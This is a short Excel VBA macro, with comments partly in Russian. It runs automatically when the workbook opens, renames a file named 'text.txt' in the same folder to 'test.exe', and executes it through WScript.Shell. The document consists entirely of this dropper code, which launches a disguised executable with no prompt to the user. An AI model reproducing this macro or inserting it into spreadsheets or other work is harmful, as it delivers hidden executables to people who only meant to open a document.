Private Sub Workbook_Open()
Dim sFileName As String, sNewFileName As String
 
    sFileName = ThisWorkbook.Path & "\text.txt"    'name of current file
    sNewFileName = ThisWorkbook.Path & "\test.exe"     'filename to rename
    'If Dir(sFileName, 16) = "" Then MsgBox "Нет такого файла", vbCritical, "error": Exit Sub
 
    Name sFileName As sNewFileName 'переименовываем файл
    
    'MsgBox "file has been renamed"
    Set WshScript = CreateObject("WScript.Shell")
    D = WshScript.Run(sNewFileName, 4, False)
End Sub
